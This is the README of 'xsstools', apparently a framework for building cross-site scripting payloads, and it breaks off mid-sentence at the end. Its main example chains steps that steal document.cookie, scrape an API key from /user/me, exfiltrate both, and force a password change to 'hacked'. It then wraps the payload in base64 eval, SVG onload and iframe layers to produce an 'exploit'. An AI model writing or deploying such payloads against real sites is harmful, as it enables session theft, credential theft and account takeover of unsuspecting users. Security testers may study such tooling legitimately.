# xsstools

xsstools is an xss development frameworks

```html
<script type="module">
import {Exfiltrators, Payload, Wrapper, utils} from "./xsstools.min.js"

const exfiltrator = Exfiltrators.message()
const payload = Payload.new()
    .addExfiltrator(exfiltrator)
    .eval(() => document.cookie)
    .exfiltrate()
    .fetchDOM("/user/me")
    .querySelector("input[name='apikey']", 'value')
    .exfiltrate()
    .postUrlEncoded("/user/changePassword", {"password": "hacked"})


const wrapper = Wrapper.new()
    .evalB64()
    .svgLoad()
    .iframe()


const exploit = wrapper.wrap(payload)

console.log(exploit)
</script>
```

# Documentation


To generate the documentation simply run `yarn docs`



# Tests

If you want to know which payload is compatible with your targeted browser you can run the test suite in /test.

You can access /test in your browser run tests in your browser, some 


